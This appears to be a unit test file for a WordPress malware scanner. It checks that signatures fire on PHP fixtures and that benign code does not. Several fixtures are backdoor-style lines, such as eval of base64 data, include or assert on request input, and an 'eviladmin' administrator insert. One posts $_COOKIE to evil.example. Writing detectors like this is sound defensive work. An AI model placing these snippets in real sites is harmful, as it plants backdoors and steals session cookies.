import tempfile
import unittest
import os
import json
from pathlib import Path

from wp_scanner import (
    FileScanner,
    SignatureManager,
    ScanStatus,
    WordPressCoreVerifier,
    WordPressExtensionVerifier,
)


class ScannerTests(unittest.TestCase):
    def setUp(self):
        manager = SignatureManager()
        manager.load_builtin()
        self.scanner = FileScanner(manager.get_all())

    def test_signature_manager_loads_builtin(self):
        manager = SignatureManager()
        count = manager.load_builtin()
        self.assertGreaterEqual(count, 100)

    def test_signature_manager_loads_custom_signatures(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            custom = root / "custom.json"
            custom.write_text(
                json.dumps(
                    [
                        {
                            "id": "CUS001",
                            "name": "Test Backdoor String",
                            "pattern": "danger_marker_123",
                            "description": "Custom marker",
                            "threat_level": "high",
                            "category": "custom",
                            "remediation": "Remove custom marker",
                        }
                    ]
                ),
                encoding="utf-8",
            )
            manager = SignatureManager(str(custom))
            manager.load_builtin()
            loaded = manager.load_custom()
            self.assertEqual(loaded, 1)
            all_ids = {sig.id for sig in manager.get_all()}
            self.assertIn("CUS001", all_ids)

    def test_should_scan_filters_by_extension_and_minified_name(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            php_file = root / "ok.php"
            minified_js = root / "app.min.js"
            txt_file = root / "notes.txt"
            bin_file = root / "image.bin"

            php_file.write_text("<?php echo 'ok';", encoding="utf-8")
            minified_js.write_text("console.log('x')", encoding="utf-8")
            txt_file.write_text("text", encoding="utf-8")
            bin_file.write_bytes(b"\x00\x01")

            self.assertTrue(self.scanner.should_scan(php_file))
            self.assertFalse(self.scanner.should_scan(minified_js))
            self.assertTrue(self.scanner.should_scan(txt_file))
            self.assertFalse(self.scanner.should_scan(bin_file))

    def test_scan_file_detects_backdoor_pattern(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "mal.php"
            target.write_text(
                "<?php\n"
                "// malware\n"
                "eval(base64_decode('ZWNobyAnaGVsbG8nOw=='));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertGreaterEqual(len(result.findings), 1)
            self.assertTrue(any(f.signature_id == "WP021" for f in result.findings))

    def test_scan_file_sets_location_for_plugin_paths(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            plugin_dir = root / "wp-content" / "plugins" / "demo-plugin"
            plugin_dir.mkdir(parents=True, exist_ok=True)
            target = plugin_dir / "mal.php"
            target.write_text(
                "<?php\n"
                "eval(base64_decode('ZWNobyAnaGVsbG8nOw=='));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP021" for f in result.findings))
            self.assertTrue(all(f.location == "plugin" for f in result.findings))

    def test_scan_file_sets_unverified_theme_location(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            theme_dir = root / "wp-content" / "themes" / "demo-theme"
            theme_dir.mkdir(parents=True, exist_ok=True)
            target = theme_dir / "functions.php"
            target.write_text(
                "<?php\n"
                "eval(base64_decode('ZWNobyAnaGVsbG8nOw=='));\n",
                encoding="utf-8",
            )
            self.scanner.unverified_extension_prefixes = {"wp-content/themes/demo-theme"}

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP021" for f in result.findings))
            self.assertTrue(all(f.location == "unverified theme" for f in result.findings))

    def test_scan_file_detects_include_from_superglobal(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "loader.php"
            target.write_text(
                "<?php\n"
                "include($_POST['payload']);\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP102" for f in result.findings))

    def test_scan_file_detects_assert_superglobal_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "exec.php"
            target.write_text(
                "<?php\n"
                "assert($_REQUEST['cmd']);\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP103" for f in result.findings))

    def test_scan_file_detects_multi_decode_chain(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "obf-chain.php"
            target.write_text(
                "<?php\n"
                "$x = base64_decode(gzinflate($payload));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP107" for f in result.findings))

    def test_scan_file_detects_chr_array_builder(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "obf-chr.php"
            target.write_text(
                "<?php\n"
                "$x = implode('', array_map('chr', array(101,118,97,108)));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP108" for f in result.findings))

    def test_scan_file_detects_suspicious_cron_callback_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "cron.php"
            target.write_text(
                "<?php\n"
                "wp_schedule_event(time(), 'hourly', eval(base64_decode($payload)));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP111" for f in result.findings))

    def test_scan_file_detects_disable_functions_tampering(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "env.php"
            target.write_text(
                "<?php\n"
                "ini_set('disable_functions', '');\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP112" for f in result.findings))

    def test_scan_file_detects_admin_user_creation_flow(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "users.php"
            target.write_text(
                "<?php\n"
                "wp_insert_user(array('user_login' => 'eviladmin', 'role' => 'administrator'));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP113" for f in result.findings))

    def test_scan_file_detects_direct_capabilities_escalation(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "meta.php"
            target.write_text(
                "<?php\n"
                "update_user_meta($uid, 'wp_capabilities', array('administrator' => true));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP114" for f in result.findings))

    def test_scan_file_does_not_flag_benign_user_lookup_as_privilege_abuse(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "lookup.php"
            target.write_text(
                "<?php\n"
                "$u = get_user_by('id', 1);\n"
                "if ($u) { echo $u->user_login; }\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertFalse(any(f.signature_id in {'WP113', 'WP114', 'WP115'} for f in result.findings))

    def test_scan_file_detects_remote_c2_insecure_endpoint(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "net.php"
            target.write_text(
                "<?php\n"
                "$r = wp_remote_get('http://185.11.22.33/ping');\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP116" for f in result.findings))

    def test_scan_file_detects_cookie_exfiltration_request(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "steal.php"
            target.write_text(
                "<?php\n"
                "$payload = $_COOKIE;\n"
                "wp_remote_post('https://evil.example/x', array('body' => $payload));\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertTrue(any(f.signature_id == "WP118" for f in result.findings))

    def test_scan_file_does_not_flag_benign_wp_remote_get(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "api.php"
            target.write_text(
                "<?php\n"
                "$r = wp_remote_get('https://api.wordpress.org/core/version-check/1.7/');\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertFalse(any(f.signature_id in {"WP116", "WP117", "WP118"} for f in result.findings))

    def test_scan_file_deduplicates_and_caps_noisy_matches(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "wallets.js"
            # Repeats bitcoin-like wallet tokens to trigger WP096 many times.
            wallet = "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"
            target.write_text("\n".join([wallet] * 200), encoding="utf-8")

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            wallet_findings = [f for f in result.findings if f.signature_id == "WP096"]
            self.assertLessEqual(
                len(wallet_findings),
                self.scanner.MAX_MATCHES_PER_SIGNATURE_PER_FILE,
            )

    def test_scan_file_does_not_flag_fontawesome_bitcoin_as_miner_pool(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "icons.css"
            target.write_text(
                ".fa-bitcoin:before { content: '\\\\f15a'; }\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertFalse(any(f.signature_id == "WP036" for f in result.findings))

    def test_scan_file_does_not_flag_gethash_sethash_as_miner_pool(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "core.js"
            target.write_text(
                "function getHash() { return location.hash; }\n"
                "function setHash(v) { location.hash = v; }\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertFalse(any(f.signature_id == "WP036" for f in result.findings))

    def test_scan_file_does_not_flag_gnu_license_text_as_system_call(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "license.txt"
            target.write_text(
                "The GNU operating system (GNU/Linux) is free software.\n",
                encoding="utf-8",
            )

            result = self.scanner.scan_file(target)
            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
            self.assertFalse(any(f.signature_id == "WP026" for f in result.findings))

    def test_collect_files_skips_git_directory(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".git").mkdir()
            (root / ".git" / "hidden.php").write_text("<?php eval($x);", encoding="utf-8")
            (root / "ok.php").write_text("<?php echo 'ok';", encoding="utf-8")

            files = self.scanner.collect_files(root)
            self.assertIn(root / "ok.php", files)
            self.assertNotIn(root / ".git" / "hidden.php", files)

    def test_heuristic_php_in_uploads_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            uploads = root / "wp-content" / "uploads"
            uploads.mkdir(parents=True, exist_ok=True)
            target = uploads / "dropper.php"
            target.write_text("<?php echo 'x';", encoding="utf-8")

            result = self.scanner.scan_file(target)
            heuristic_ids = {f.signature_id for f in result.findings}
            self.assertIn("H001", heuristic_ids)

    def test_heuristic_world_writable_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "perm.php"
            target.write_text("<?php echo 'x';", encoding="utf-8")
            os.chmod(target, 0o666)

            result = self.scanner.scan_file(target)
            heuristic_ids = {f.signature_id for f in result.findings}
            self.assertIn("H003", heuristic_ids)

    def test_heuristic_high_entropy_token_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            token = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 4
            target = root / "obf.php"
            target.write_text(f"<?php\n$blob = '{token}';\n", encoding="utf-8")

            result = self.scanner.scan_file(target)
            heuristic_ids = {f.signature_id for f in result.findings}
            self.assertIn("H004", heuristic_ids)

    def test_verify_core_filters_identical_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            scan_root = root / "scan"
            ref_root = root / ".wp-scanner-cache" / "wordpress-core" / "6.5.3" / "wordpress"
            (scan_root / "wp-includes").mkdir(parents=True, exist_ok=True)
            (ref_root / "wp-includes").mkdir(parents=True, exist_ok=True)

            version_php = "<?php\n$wp_version = '6.5.3';\n"
            core_php = "<?php echo 'core';\n"
            changed_php = "<?php echo 'changed';\n"
            plugin_php = "<?php echo 'plugin';\n"

            (scan_root / "wp-includes" / "version.php").write_text(version_php, encoding="utf-8")
            (ref_root / "wp-includes" / "version.php").write_text(version_php, encoding="utf-8")
            (scan_root / "wp-includes" / "load.php").write_text(changed_php, encoding="utf-8")
            (ref_root / "wp-includes" / "load.php").write_text(core_php, encoding="utf-8")
            (scan_root / "wp-config.php").write_text("<?php\n", encoding="utf-8")
            (ref_root / "wp-config.php").write_text("<?php\n", encoding="utf-8")
            (scan_root / "wp-content" / "plugins").mkdir(parents=True, exist_ok=True)
            (scan_root / "wp-content" / "plugins" / "x.php").write_text(plugin_php, encoding="utf-8")

            verifier = WordPressCoreVerifier(cache_dir=root / ".wp-scanner-cache", offline=True)
            ok, _msg = verifier.prepare(scan_root)
            self.assertTrue(ok)

            files = self.scanner.collect_files(scan_root)
            filtered, skipped, modified = verifier.filter_identical_core_files(scan_root, files)
            filtered_set = set(filtered)
            self.assertGreaterEqual(skipped, 2)  # version.php and wp-config.php
            self.assertIn(scan_root / "wp-includes" / "load.php", filtered_set)  # changed core file kept
            self.assertIn(scan_root / "wp-content" / "plugins" / "x.php", filtered_set)  # non-core file kept
            self.assertIn(scan_root / "wp-includes" / "load.php", modified)

            result = self.scanner.scan_file(scan_root / "wp-includes" / "load.php")
            heuristic_ids = {f.signature_id for f in result.findings}
            self.assertNotIn("H005", heuristic_ids)

    def test_verify_extensions_filters_identical_files_and_skips_bundled(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            scan_root = root / "scan"
            cache_root = root / ".wp-scanner-cache"

            # Local plugin files.
            plugin_dir = scan_root / "wp-content" / "plugins" / "demo-plugin"
            plugin_dir.mkdir(parents=True, exist_ok=True)
            plugin_main = plugin_dir / "demo-plugin.php"
            plugin_main.write_text(
                "<?php\n"
                "/*\n"
                "Plugin Name: Demo Plugin\n"
                "Version: 1.2.3\n"
                "*/\n"
                "echo 'ok';\n",
                encoding="utf-8",
            )
            plugin_extra = plugin_dir / "extra.php"
            plugin_extra.write_text("<?php echo 'changed';\n", encoding="utf-8")

            # Bundled core plugin-like file should be ignored by extension baseline.
            bundled_file = scan_root / "wp-content" / "plugins" / "hello.php"
            bundled_file.write_text("<?php echo 'hello';\n", encoding="utf-8")

            # Cached reference for demo-plugin@1.2.3.
            ref_root = cache_root / "extensions" / "plugin" / "demo-plugin" / "1.2.3"
            (ref_root / "demo-plugin").mkdir(parents=True, exist_ok=True)
            (ref_root / ".ready").write_text("ok", encoding="utf-8")
            (ref_root / "demo-plugin" / "demo-plugin.php").write_text(
                "<?php\n"
                "/*\n"
                "Plugin Name: Demo Plugin\n"
                "Version: 1.2.3\n"
                "*/\n"
                "echo 'ok';\n",
                encoding="utf-8",
            )
            (ref_root / "demo-plugin" / "extra.php").write_text("<?php echo 'reference';\n", encoding="utf-8")

            verifier = WordPressExtensionVerifier(cache_dir=cache_root, offline=True)
            ok, _msg = verifier.prepare(scan_root, core_hashes={"wp-content/plugins/hello.php": "dummy"})
            self.assertTrue(ok)

            files = self.scanner.collect_files(scan_root)
            filtered, skipped = verifier.filter_identical_extension_files(scan_root, files)
            filtered_set = set(filtered)
            self.assertGreaterEqual(skipped, 1)  # unchanged demo-plugin.php skipped
            self.assertIn(plugin_extra, filtered_set)  # changed file remains for scan
            self.assertIn(bundled_file, filtered_set)  # bundled file not extension-verified here


if __name__ == "__main__":
    unittest.main()
